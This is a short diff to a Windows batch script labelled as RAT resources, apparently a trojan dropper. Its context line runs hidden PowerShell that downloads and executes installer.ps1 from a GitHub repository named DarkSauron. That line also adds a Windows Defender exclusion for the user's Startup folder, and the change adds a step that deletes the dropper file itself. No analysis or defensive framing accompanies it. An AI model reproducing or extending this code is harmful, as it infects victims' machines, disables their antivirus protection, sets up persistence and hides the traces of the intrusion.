@@ -38,5 +38,6 @@ REM rat resources
 
  powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1";Add-Mpreference-ExclusionPath "C:/Users/%username%AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; ./installer.ps1
  
-rem this is for the testing to update the repo
+@REM self delete 
+del wget.cmd
 
